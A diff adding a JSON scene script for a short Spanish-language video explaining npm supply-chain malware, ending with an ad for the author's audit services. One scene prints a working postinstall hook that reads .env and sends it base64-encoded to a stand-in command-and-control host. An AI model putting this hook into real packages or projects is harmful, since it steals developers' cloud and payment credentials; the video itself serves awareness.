@@ -1,0 +1,105 @@
+{
+  "title": "[09] Anatomía de un malware en NPM: Robo de .env en scripts postinstall (Var A)",
+  "category": "CIBERSEGURIDAD & SUPPLY CHAIN",
+  "slug": "09_seguridad_supply_chain",
+  "variation": "A",
+  "fps": 30,
+  "scenes": [
+    {
+      "id": "hook_security",
+      "type": "kinetic_hook",
+      "duration": 4.5,
+      "voiceover": "¿Sabías que ejecutar npm install puede darle acceso total a tu computadora a un hacker? Así funciona un ataque de supply chain en 2026.",
+      "visual_cue": "Gancho cinético sobre malware en dependencias",
+      "props": {
+        "badge": "CIBERSEGURIDAD 2026",
+        "lines": [
+          {
+            "text": "ANATOMÍA DE UN",
+            "color": "#ffffff"
+          },
+          {
+            "text": "MALWARE EN NPM",
+            "color": "#ef4444"
+          }
+        ],
+        "subtitle": "ROBO DE SECRETOS VIA SCRIPTS POSTINSTALL",
+        "icon": "zero_trust_lock"
+      }
+    },
+    {
+      "id": "exploit_code",
+      "type": "code_terminal",
+      "duration": 6.5,
+      "voiceover": "El paquete parece una utilidad inofensiva, pero su script postinstall lee tus variables de entorno y las envía codificadas a un servidor externo.",
+      "visual_cue": "Terminal mostrando el payload malicioso oculto en package.json",
+      "props": {
+        "header": "PAYLOAD DEL ATACANTE",
+        "title": "SCRIPT POSTINSTALL OFUSCADO",
+        "filename": "node_modules/fake-lib/package.json",
+        "codeLines": [
+          "\"scripts\": {",
+          "  \"postinstall\": \"node -e \\\"const fs=require('fs'),https=require('https');",
+          "    const env = fs.readFileSync('.env', 'utf8');",
+          "    https.get('https://c2-server.com/leak?d=' + Buffer.from(env).toString('base64'));\\\"\"",
+          "}",
+          "// Las claves de AWS, Stripe y bases de datos quedan expuestas"
+        ],
+        "cursorLine": 4
+      }
+    },
+    {
+      "id": "leak_pipe",
+      "type": "network_pipeline",
+      "duration": 6,
+      "voiceover": "El desarrollador ni siquiera se da cuenta porque el comando npm install termina exitosamente mientras sus credenciales viajan por la red.",
+      "visual_cue": "Pipeline visual mostrando la exfiltración silenciosa hacia el servidor de comando y control",
+      "props": {
+        "header": "EXFILTRACIÓN SILENCIOSA",
+        "title": "FILTRACIÓN DE CLAVES .ENV",
+        "subtitle": "TRÁFICO DE SALIDA SIN BARRERAS DE RED",
+        "stages": [
+          {
+            "id": "dev",
+            "label": "TERMINAL DEL DESARROLLADOR",
+            "sub": "npm install ejecutado con permisos root/locales",
+            "y": 220,
+            "color": "#ef4444",
+            "metric": "Comprometido"
+          },
+          {
+            "id": "network",
+            "label": "EXFILTRACIÓN HTTPS",
+            "sub": "Envío de payload base64 en puerto 443",
+            "y": 520,
+            "color": "#fbbf24",
+            "metric": "Sin bloqueo"
+          },
+          {
+            "id": "c2",
+            "label": "SERVIDOR DEL ATACANTE",
+            "sub": "Extracción automática de AWS_SECRET_ACCESS_KEY",
+            "y": 820,
+            "color": "#a855f7",
+            "metric": "Claves robadas"
+          }
+        ]
+      }
+    },
+    {
+      "id": "cta_security",
+      "type": "tradeoff_matrix",
+      "duration": 5,
+      "voiceover": "Audito la seguridad de dependencias y diseño pipelines Zero-Trust para empresas que quieren blindar su código. Link en mi biografía.",
+      "visual_cue": "Cierre con auditoría de seguridad de dependencias",
+      "props": {
+        "header": "AUDITORÍA DE SEGURIDAD & SUPPLY CHAIN",
+        "title": "PROTEGE TU CADENA DE SUMINISTRO",
+        "cta": {
+          "badge": "AUDITORÍA DE SEGURIDAD // SEDEV",
+          "text": "¿Revisas qué ejecutan tus paquetes de NPM? Link en mi perfil para auditar tu pipeline."
+        }
+      }
+    }
+  ]
+}
